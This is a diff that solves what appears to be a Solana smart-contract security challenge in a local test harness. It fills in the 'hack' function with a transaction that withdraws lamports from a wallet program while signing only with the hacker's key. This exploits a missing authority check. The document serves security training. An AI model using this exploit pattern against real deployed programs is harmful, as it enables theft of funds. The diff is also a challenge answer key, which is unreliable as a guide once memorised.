@@ -18,7 +18,28 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+    use borsh::BorshSerialize;
+    use level1::WalletInstruction;
+    use solana_program::instruction::{AccountMeta, Instruction};
+
+    _env.execute_as_transaction(
+        &[Instruction {
+            program_id: _challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(_challenge.wallet_address, false),
+                AccountMeta::new(_challenge.wallet_authority, false),
+                AccountMeta::new(_challenge.hacker.pubkey(), true),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount: 1_000_000 }
+                .try_to_vec()
+                .unwrap(),
+        }],
+        &[&_challenge.hacker],
+    )
+    .print();
+}
 
 /*
 SETUP CODE BELOW
@@ -26,6 +47,7 @@ SETUP CODE BELOW
 pub fn main() {
     let (mut env, challenge, internal) = setup();
     let before_balance = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;
+    println!("balance before {}", before_balance);
     hack(&mut env, &challenge);
     verify(&mut env, challenge, before_balance, internal);
 }
